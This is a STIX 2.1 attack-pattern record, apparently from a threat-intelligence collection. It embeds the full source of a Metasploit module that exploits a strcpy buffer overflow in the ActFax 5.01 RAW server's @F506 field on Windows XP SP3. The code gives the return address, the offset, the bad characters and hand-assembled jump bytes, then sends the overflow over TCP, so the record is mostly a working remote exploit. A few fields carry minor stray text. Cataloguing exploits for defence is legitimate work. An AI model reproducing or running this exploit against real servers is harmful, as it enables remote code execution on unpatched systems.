{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9759a3c8-9683-4117-b32d-83c6ca2f5eb1",
    "created": "2024-08-14T16:45:53.194022Z",
    "modified": "2024-08-14T16:45:53.194026Z",
    "name": "ActFax 5.01 RAW Server Buffer Overflow",
    "description": " This module exploits a vulnerability in ActFax Server 5.01 RAW server. The RAW Server can be used to transfer fax messages without any underlying protocols. To note significant fields in the fax being transferred, like the fax number or the recipient, ActFax data fields can be used. This module exploits a buffer overflow in the handling of the @F506 fields due to the insecure usage of strcpy. This module has been tested successfully on ActFax 5.01 over Windows XP SP3 (English).  'License'\t\t=> MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/actfax_raw_server_bof.rb",
            "external_id": "actfax_raw_server_bof.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.pwnag3.com/2013/02/actfax-raw-server-exploit.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t=> 'ActFax 5.01 RAW Server Buffer Overflow',\n      'Description'\t=> %q{\n          This module exploits a vulnerability in ActFax Server 5.01 RAW server. The RAW\n        Server can be used to transfer fax messages without any underlying protocols. To\n        note significant fields in the fax being transferred, like the fax number or the\n        recipient, ActFax data fields can be used. This module exploits a buffer overflow\n        in the handling of the @F506 fields due to the insecure usage of strcpy. This\n        module has been tested successfully on ActFax 5.01 over Windows XP SP3 (English).\n      },\n      'License'\t\t=> MSF_LICENSE,\n      'Author'\t\t=>\n        [\n          'Craig Freyman', # @cd1zz # discovery and Metasploit module\n          'corelanc0d3r', # Metasploit module\n          'juan vazquez' # Metasploit module cleanup\n        ],\n      'References'\t=>\n        [\n          [ 'OSVDB', '89944' ],\n          [ 'BID', '57789' ],\n          [ 'EDB', '24467' ],\n          [ 'URL', 'http://www.pwnag3.com/2013/02/actfax-raw-server-exploit.html' ]\n        ],\n      'Platform'\t=> 'win',\n      'Payload'\t=>\n        {\n          'BadChars' => (0x00..0x1f).to_a.pack(\"C*\") + \"\\x40\",\n          'DisableNops' => true,\n          'Space' => 1024,\n          'EncoderOptions' =>\n            {\n              'BufferRegister' => 'ECX'\n            }\n        },\n      'Targets'\t\t =>\n        [\n          [ 'ActFax 5.01 / Windows XP SP3',\n            {\n              'Ret'   \t=>\t0x77c35459, # push esp # ret # msvcrt.dll\n              'Offset'\t=>\t1024\n            }\n          ],\n        ],\n      'Privileged'\t => false,\n      'DisclosureDate' => '2013-02-05',\n      'DefaultTarget'\t => 0))\n\n  end\n\n  def exploit\n    connect\n    p = payload.encoded\n    buffer = p\n    buffer << rand_text(target['Offset'] - p.length)\n    buffer << [target.ret].pack(\"V\")\n    buffer << \"\\x89\\xe1\" # mov ecx, esp\n    buffer << \"\\x81\\xC1\\xFC\\xFB\\xFF\\xFF\" # add ecx, -1028\n    buffer << \"\\x81\\xC4\\x6C\\xEE\\xFF\\xFF\" # add esp, -4500\n    buffer << \"\\xE9\\xE9\\xFB\\xFF\\xFF\" # jmp $-1042\n    print_status(\"Trying target #{target.name}...\")\n    sock.put(\"@F506 \"+buffer+\"@\\r\\n\\r\\n\")\n    disconnect\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2013-02-05",
    "x_mitre_platforms": [
        "win'"
    ]
}